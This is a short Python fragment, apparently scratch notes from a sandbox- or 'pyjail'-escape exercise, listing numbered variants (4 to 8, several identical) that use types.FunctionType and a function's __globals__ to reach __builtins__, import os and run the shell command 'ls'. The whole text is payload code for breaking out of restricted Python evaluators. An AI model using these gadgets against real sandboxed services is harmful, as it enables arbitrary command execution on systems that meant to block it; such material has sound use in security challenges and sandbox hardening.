from types import FunctionType
list(FunctionType(lambda: 42,globals()).__globals__.values())[0]()

# 4.
# from types import FunctionType
# FunctionType(lambda: 42,globals()).__globals__['__builtins__']['__import__']('os').system('ls')

# 5.
# from types import FunctionType
# eval(FunctionType(lambda: 42,globals()).__globals__['__builtins__']['__import__']('os').system('ls'))

# 6.
# from types import FunctionType
# FunctionType(lambda: 42,globals()).__globals__['__builtins__']['__import__']('os').system('ls')

# 7.
# from types import FunctionType
# FunctionType(lambda: 42,globals()).__globals__['__builtins__']['__import__']('os').system('ls')

# 8.
# from types import FunctionType
# FunctionType(lambda: 42,globals()).__globals__
